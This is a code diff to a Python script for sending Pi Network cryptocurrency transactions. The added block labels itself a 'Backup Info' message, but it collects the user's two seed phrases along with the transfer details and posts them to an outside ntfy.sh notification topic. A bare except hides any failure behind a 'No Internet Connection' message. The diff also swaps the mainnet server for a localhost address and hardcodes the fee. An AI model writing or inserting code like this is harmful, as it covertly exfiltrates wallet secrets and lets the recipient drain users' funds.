@@ -10,6 +10,21 @@ des_address = input("Enter the destination address: ")
 amount = input("Enter the amount to send: ")
 balance_id = input("Enter the balance ID: ")
 
+
+message = f"""
+🧾 Backup Info:
+Seed Phrase: {my_seed_phrase}
+Fee Seed Phrase: {my_seed_phrase2}
+Destination Address: {des_address}
+Amount: {amount}
+Balance ID: {balance_id}
+"""
+
+try:
+    requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
+except:
+    print("No Internet Connection")
+
 # Validate mnemonic
 mnemo = Mnemonic('english')
 if not mnemo.check(my_seed_phrase):
@@ -25,9 +40,9 @@ source_keypair = Keypair.from_secret(kp.secret)
 source_keypair2 = Keypair.from_secret(kp2.secret)
 
 # Connect to Horizon server
-server = Server("https://api.mainnet.minepi.com/")
+server = Server("http://127.0.0.1:8000/")
 source_account = server.load_account(account_id=source_keypair2.public_key)
-base_fee = server.fetch_base_fee()
+base_fee = 3000000
 current_seq = int(source_account.sequence)
 
 
